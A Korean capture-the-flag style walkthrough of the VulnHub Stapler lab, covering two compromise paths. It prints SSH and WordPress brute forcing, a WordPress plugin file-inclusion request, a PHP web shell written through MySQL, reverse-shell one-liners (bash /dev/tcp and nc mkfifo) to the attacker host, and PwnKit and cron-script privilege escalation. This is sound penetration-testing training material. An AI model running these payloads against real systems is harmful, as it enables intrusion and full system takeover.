# Stapler - VulnHub Writeup (KR)

### 간단한 랩 소개

Stapler는 2016년 BsidesLondon 컨퍼런스를 위해 보안 전문가 g0tmi1k이 제작한 VulnHub의 Boot-to-Root 머신이다

보통의 머신은 일반 사용자 권한에서 시작해 root 권한 획득이 기본 목표이지만 Stapler 같은 경우 단 하나의 경로가 아니라 최소 2가지 이상의 침투 경로와 최소 3가지 이상의 권한 상승 방법이 존재한다

그렇기 때문에 실전에서 중요한 다방면 공격 벡터 탐색 능력을 길러주기에 적절한 머신이다

---

### 침투 경로 - 1

가장 먼저 열린 호스트와 포트(서비스)를 식별하기 위해 nmap을 실행해 주었다

**호스트 스캔:**

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ nmap -p- --min-rate 3000 -Pn 192.168.122.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-17 08:03 PST
Nmap scan report for 192.168.122.179
Host is up (0.00022s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
MAC Address: 52:54:00:40:B9:14 (QEMU virtual NIC)

Nmap scan report for 192.168.122.1
Host is up (0.0000060s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain

Nmap done: 256 IP addresses (2 hosts up) scanned in 45.12 seconds

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

**포트 스캔:**

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ nmap -p 20,21,22,53,80,123,137,138,139,666,3306,12380 --min-rate 3000 -A -Pn 192.168.122.179
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-17 13:27 PST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 37.50% done; ETC: 13:27 (0:00:10 remaining)
Nmap scan report for 192.168.122.179
Host is up (0.00052s latency).

PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.122.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   pkzip-file  .ZIP file
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 53.44 seconds

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

포트 스캔 결과 ftp 서버에 익명 로그인이 가능한 것을 확인하였다

ftp 서버 접속 결과 배너 그래빙에서 유저 네임 Harry와 note 파일에서 유저네임 Elly를 확인하였다

나머지 유효한 정보는 찾지 못하였으니 enum4linux를 이용해 시스템 정보를 열거하였다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ enum4linux -a 192.168.122.179
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Apr 17 14:19:58 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.122.179
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ==========================( Enumerating Workgroup/Domain on 192.168.122.179 )==========================

[+] Got domain/workgroup name: WORKGROUP

 ================================( Share Enumeration on 192.168.122.179 )================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

//192.168.122.179/kathy Mapping: OK Listing: OK Writing: N/A
//192.168.122.179/tmp   Mapping: OK Listing: OK Writing: N/A

 ==========================( Password Policy Information for 192.168.122.179 )==========================

        [+] Minimum password length: 5
        [+] Password Complexity Flags: 000000

 =================( Users on 192.168.122.179 via RID cycling (RIDS: 500-550,1000-1050) )=================

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

enum4linux complete on Fri Apr 17 14:20:13 2026

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

열거 결과 공유 폴더 디스크에서 코멘트(유저네임-Fred)를 확인하였으며 추가로 패스워드 정책과 유저 목록을 확보하였다

또한 nmap 포트 스캔 결과에서 smb에 익명 로그인(account_used: guest)이 가능하다는 것을 확인 하였기 때문에 추가로 smb 서버도 탐색하였다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ smbclient //192.168.122.179/kathy -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun  4 00:52:52 2016
  ..                                  D        0  Tue Jun  7 05:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 23:02:27 2016
  backup                              D        0  Sun Jun  5 23:04:14 2016

smb: \kathy_stuff\> get todo-list.txt
smb: \kathy_stuff\> !cat todo-list.txt
I'm making sure to backup anything important for Initech, Kathy

smb: \backup\> ls
  vsftpd.conf                         N     5961  Sun Jun  5 23:03:45 2016
  wordpress-4.tar.gz                  N  6321767  Tue Apr 28 01:14:46 2015

smb: \backup\> !cat vsftpd.conf
...
chroot_local_user=YES
userlist_enable=YES
local_root=/etc
...
pasv_enable=no
smb: \backup\>
```

탐색 결과 ftp 서버의 동작 정의 파일(vsftpd.conf)과 root 디렉토리가 /etc로 설정(local_root=/etc) 되어 있는 것을 확인 하였다

특히 local_root=/etc 옵션이 설정되어 있으면 로컬 권한을 가지고 있어도 etc에 접근이 가능해져 추가 공격에 매우 취약해진다

다음으로 이전에 얻은 유저 목록들을 이용하여 ssh 서버에 브루트 포싱을 시도해 주도록 하겠다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt ssh://192.168.122.179 -t 30
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-18 21:47:59
[DATA] attacking ssh://192.168.122.179:22/
[22][ssh] host: 192.168.122.179   login: MFrei   password: letmein
[22][ssh] host: 192.168.122.179   login: CJoo   password: summer2017
[22][ssh] host: 192.168.122.179   login: Drew   password: qwerty
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-18 22:20:10

┌──(jaejun835㉿jaejun835)-[~]
└─$ ssh MFrei@192.168.122.179
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
MFrei@192.168.122.179's password:
Welcome back!

MFrei@red:~$
```

ssh에 브루트 포싱을 시도한 결과 계정 획득과 로그인에 성공하였다

이후 취약점을 찾기 위해 SUID 열거를 실행하였으며 실행 결과 pkexec에 SUID가 설정되어 있음을 확인하였다

pkexec는 CVE-2021-4034(PwnKit) 취약점으로 알려진 로컬 권한 상승 취약점이 존재하며 이를 이용해 일반 유저에서 root 권한 획득이 가능하다

이를 이용해 로컬 셸에서 PwnKit 파일을 scp로 타겟 서버에 전송하고 SUID 권한으로 실행하여 root 권한을 얻도록 하겠다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ git clone https://github.com/ly4k/PwnKit
cd PwnKit
Cloning into 'PwnKit'...
remote: Enumerating objects: 46, done.
remote: Total 46 (delta 0), reused 0 (delta 0), pack-reused 44 (from 1)
Receiving objects: 100% (46/46), 580.57 KiB | 2.02 MiB/s, done.

┌──(jaejun835㉿jaejun835)-[~/PwnKit]
└─$ scp PwnKit32 MFrei@192.168.122.179:/tmp/
MFrei@192.168.122.179's password:
PwnKit32                                        100%   16KB  32.8MB/s   00:00

┌──(jaejun835㉿jaejun835)-[~/PwnKit]
└─$
```

```
MFrei@red:~$ cd /tmp
MFrei@red:/tmp$ chmod +x PwnKit32
MFrei@red:/tmp$ ./PwnKit32
root@red:/tmp# cat /root/flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

root@red:/tmp#
```

실행 결과 성공적으로 root 권한을 획득 하였다

---

## 침투 경로 - 2

앞서 진행한 포트 스캔 결과에서 80 포트와 12380 포트가 웹 서비스로 동작하고 있음을 확인하였다

80 포트로 접속을 시도하였으나 "Not Found" 페이지만 반환되어 유효한 정보를 얻을 수 없었다

12380 포트는 HTTPS로 운영되고 있었으며 접속 결과 "Internal Index Page!" 메시지를 확인하였다

해당 포트를 대상으로 gobuster를 실행하여 숨겨진 디렉토리를 탐색하였다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ gobuster dir -u https://192.168.122.179:12380 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.122.179:12380
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 333] [--> https://192.168.122.179:12380/javascript/]
/phpmyadmin           (Status: 301) [Size: 333] [--> https://192.168.122.179:12380/phpmyadmin/]
/announcements        (Status: 301) [Size: 336] [--> https://192.168.122.179:12380/announcements/]
/server-status        (Status: 403) [Size: 306]
Progress: 29999 / 29999 (100.00%)
===============================================================
Finished
===============================================================

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

추가로 robots.txt를 확인한 결과 `/admin112233/` 과 `/blogblog/` 경로가 Disallow로 등록되어 있음을 확인하였다

![robots.txt](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(10).png)

robots.txt의 Disallow 항목은 검색 엔진 크롤러의 접근을 막기 위한 설정이지만 오히려 숨겨진 경로를 노출시키는 역할을 한다

`/blogblog/` 로 접속한 결과 WordPress 블로그가 운영되고 있음을 확인하였으며 이를 대상으로 wpscan을 실행하여 추가 정보를 열거하였다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ wpscan --url https://192.168.122.179:12380/blogblog --disable-tls-checks -e u,ap,at,tt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://192.168.122.179:12380/blogblog/ [192.168.122.179]
[+] Started: Thu Apr 23 14:11:54 2026

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here

[+] XML-RPC seems to be enabled: https://192.168.122.179:12380/blogblog/xmlrpc.php

[+] Upload directory has listing enabled: https://192.168.122.179:12380/blogblog/wp-content/uploads/

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).

[+] WordPress theme in use: bhost
 | Version: 1.2.9 (80% confidence)

[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.

[i] User(s) Identified:

[+] peter
[+] john
[+] elly
[+] barry
[+] heather
[+] garry
[+] harry
[+] scott
[+] kathy
[+] tim

[+] Finished: Thu Apr 23 14:12:43 2026
[+] Elapsed time: 00:00:49

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

스캔 결과 WordPress 버전이 4.2.1로 매우 오래된 버전임을 확인하였으며 업로드 디렉토리 리스팅이 활성화되어 있고 XML-RPC가 활성화되어 있음을 확인하였다

또한 유저 열거를 통해 10명의 유저 목록을 확보하였으며 확보한 유저 목록을 바탕으로 XML-RPC를 이용한 브루트포스를 시도하였다

XML-RPC를 이용하면 한 번의 요청으로 여러 패스워드를 시도할 수 있어 일반 wp-login 방식보다 훨씬 빠르다

```
wpscan --url https://192.168.122.179:12380/blogblog --disable-tls-checks -U users.txt -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
```

브루트포스 결과 아래 4개의 계정 크리덴셜을 획득하였다

```
harry / monkey
garry / football
scott / cookie
kathy / coolgirl
```

획득한 계정으로 WordPress 관리자 페이지에 로그인을 시도하였으나 획득한 계정들이 모두 일반 유저 권한이었으며 테마 에디터나 플러그인 메뉴에 접근이 불가능하였다

따라서 다른 방법으로 접근하기 위해 wpscan 스캔 결과에서 업로드 디렉토리 리스팅이 활성화되어 있음을 확인하였다

이를 바탕으로 플러그인 디렉토리에도 동일하게 리스팅이 활성화되어 있을 것으로 판단하여 접속을 시도하였다

```
https://192.168.122.179:12380/blogblog/wp-content/plugins/
```

![plugins directory listing](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(11).png)

접속 결과 디렉토리 리스팅이 활성화되어 있었으며 설치된 플러그인 목록을 확인할 수 있었다 그 중 advanced-video-embed-embed-videos-or-playlists 플러그인이 설치되어 있음을 확인하였다

단 실전 환경에서는 디렉토리 리스팅이 비활성화되어 있는 경우가 대부분이므로 아래와 같이 wpscan으로도 플러그인 열거가 가능하다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ wpscan --url https://192.168.122.179:12380/blogblog --disable-tls-checks -e ap --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://192.168.122.179:12380/blogblog/ [192.168.122.179]
[+] Started: Mon May  4 07:59:39 2026

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:04 <=====> (119723 / 119723) 100.00% Time: 00:01:04

[i] Plugin(s) Identified:

[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.122.179:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | [!] Directory listing is enabled
 | Found By: Known Locations (Aggressive Detection)
 | Version: 1.0 (80% confidence)

[+] shortcode-ui
 | Version: 0.6.2 (100% confidence)

[+] two-factor
 | The version could not be determined.

[+] Finished: Mon May  4 08:00:53 2026
[+] Elapsed time: 00:01:13

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

해당 플러그인 버전 1.0에는 CVE-2016-1209 (EDB-39646) Local File Inclusion 취약점이 존재한다

해당 취약점은 플러그인의 ave_publishPost AJAX 액션이 thumb 파라미터를 아무런 검증 없이 파일 경로로 사용하기 때문에 발생하며 인증 없이도 서버 내부의 임의 파일을 읽을 수 있다

아래 URL 요청을 통해 wp-config.php 파일을 읽도록 시도하였다

```
https://192.168.122.179:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
```

![LFI request result](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(12).png)

요청 결과 `/wp-content/uploads/` 디렉토리에 wp-config.php 내용을 담은 .jpeg 파일이 생성되었으며 해당 파일을 열어 데이터베이스 크리덴셜을 획득하였다

![uploads directory](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(13).png)

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -k https://192.168.122.179:12380/blogblog/wp-content/uploads/1596487826.jpeg
<?php
/**
 * The base configurations of the WordPress.
 */

// ** MySQL settings - You can get this info from your web host ** //
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8mb4');
define('DB_COLLATE', '');

define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

$table_prefix  = 'wp_';
define('WP_DEBUG', false);
define('WP_HTTP_BLOCK_EXTERNAL', true);

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

```
DB_USER: root
DB_PASSWORD: plbkac
```

획득한 크리덴셜을 이용해 아래와 같이 MySQL에 있는 WordPress 유저들의 패스워드 해시를 추출해 주었다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ mysql -u root -pplbkac -h 192.168.122.179 --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 5.7.12-0ubuntu1 (Ubuntu)

MySQL [(none)]> use wordpress;
Database changed
MySQL [wordpress]> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+------------------------------------+
16 rows in set (0.000 sec)

MySQL [wordpress]>
```

추출한 해시를 john으로 크랙할 수 있지만 아래와 같이 관리자의 크리덴셜만 수정하는 것이 가능하다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ mysql -u root -pplbkac -h 192.168.122.179 --skip-ssl
MySQL [(none)]> use wordpress;
Database changed
MySQL [wordpress]> select user_login, user_email from wp_users where ID=1;
+------------+--------------------+
| user_login | user_email         |
+------------+--------------------+
| John       | john@red.localhost |
+------------+--------------------+
1 row in set (0.001 sec)

MySQL [wordpress]> UPDATE wp_users SET user_pass = MD5('hacked123') WHERE user_login = 'John';
Query OK, 1 row affected (0.131 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [wordpress]>
```

성공적으로 관리자 권한을 획득하였다

획득한 관리자 권한으로 플러그인 업로드를 통해 웹쉘 삽입을 시도하였으나 WordPress가 파일 설치 시 FTP 크리덴셜을 요구하여 업로드가 불가능하였다

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

![FTP credentials required](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(14).png)

따라서 앞서 획득한 DB 크리덴셜을 이용하여 MySQL에 직접 접속한 후 `SELECT INTO OUTFILE` 구문으로 웹쉘을 업로드 디렉토리에 직접 삽입하였다

```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ mysql -u root -pplbkac -h 192.168.122.179 --ssl=0 -e "SELECT '<?php echo shell_exec(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php';"

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

이후 아래 URL로 웹쉘 동작을 확인하였다

```
https://192.168.122.179:12380/blogblog/wp-content/uploads/shell.php?cmd=id
```

![webshell working](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(15).png)

`www-data` 권한으로 명령어가 실행되는 것을 확인하였다

웹쉘 업로드 후 리버스쉘 명령어를 직접 URL로 전달할 경우 `&` 문자가 URL 파라미터 구분자로 인식되어 명령어가 깨지는 문제가 발생하였다

이를 우회하기 위해 Kali에서 리버스쉘 명령어를 파일에 저장하고 웹서버로 호스팅하는 방식을 사용하였다

```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ echo 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1' > /tmp/rev.sh
cd /tmp && python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

웹쉘을 통해 타겟 서버가 rev.sh를 다운로드하도록 하였다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -k "https://192.168.122.179:12380/blogblog/wp-content/uploads/shell.php?cmd=wget+http://192.168.122.1/rev.sh+-O+/tmp/rev.sh"
```

nc 리스너를 열고 타겟 서버에서 rev.sh를 실행시켜 리버스쉘 연결에 성공하였다

```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -k "https://192.168.122.179:12380/blogblog/wp-content/uploads/shell.php?cmd=bash+/tmp/rev.sh"
```

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.122.179 49986
bash: cannot set terminal process group (1017): Inappropriate ioctl for device
bash: no job control in this shell
www-data@red:/var/www/https/blogblog/wp-content/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

www-data 권한의 쉘을 획득한 후 권한 상승을 위해 시스템을 열거하던 중 `/etc/cron.d/` 를 확인한 결과 `cron-logrotate.sh` 가 5분마다 root 권한으로 실행되고 있음을 확인하였다

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cat /etc/cron.d/*
cat /etc/cron.d/*
*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
#
# cron.d/mdadm -- schedules periodic redundancy checks of MD devices
57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

해당 파일의 권한을 확인한 결과 world-writable로 설정되어 있음을 확인하였다

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ ls -la /usr/local/sbin/cron-logrotate.sh
-rwxrwxrwx 1 root root 81 Apr 30 02:55 /usr/local/sbin/cron-logrotate.sh
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

root가 실행하는 스크립트를 일반 유저도 수정할 수 있으므로 해당 스크립트에 리버스쉘 코드를 삽입하였다

처음에는 bash `/dev/tcp` 방식을 시도하였으나 해당 박스에서 지원되지 않아 nc mkfifo 방식으로 변경하였다

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 4444 >/tmp/f' > /usr/local/sbin/cron-logrotate.sh
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cat /usr/local/sbin/cron-logrotate.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 4444 >/tmp/f
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

Kali에서 nc 리스너를 열고 대기하였다

```bash
nc -lvnp 4444
```

5분 이내로 cron이 스크립트를 실행하면서 root 권한의 리버스쉘 연결이 들어왔다

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.122.179 44188
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
fix-wordpress.sh
flag.txt
issue
python.sh
wordpress.sql
# cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

#
```

성공적으로 root 권한을 획득하였다
